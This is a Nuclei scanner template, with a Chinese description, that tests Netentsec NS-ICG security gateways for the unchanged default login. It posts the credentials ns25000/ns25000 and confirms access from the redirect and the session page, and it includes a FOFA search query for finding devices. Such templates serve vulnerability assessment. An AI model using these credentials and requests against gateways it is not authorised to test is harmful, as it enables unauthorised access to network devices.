id: nsicg-default-login

info:
  name: Netentsec NS-ICG 默认口令登录（弱口令）
  author: pikpikcu
  severity: high
  description: |
    该模板通过尝试 Netentsec NS-ICG 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08603
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:netentsec:application_security_gateway:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    fofa-query: "NS-ICG"
    product: application_security_gateway
    vendor: netentsec
  tags: nsicg,default-login,vuln

http:
  - raw:
      - |
        @timeout: 25s
        POST /user/login/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        usrname={{username}}&pass={{password}}&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree=
      - |
        @timeout: 25s
        GET /user/main HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/user/login/

    attack: pitchfork
    payloads:
      username:
        - ns25000
      password:
        - ns25000
    matchers:
      - type: dsl
        dsl:
          - 'contains(header_1, "/user/main/")'
          - 'status_code_1 == 302'
          - 'status_code_2 == 200'
          - contains(body_2, "var loguser = \'ns25000")
        condition: and
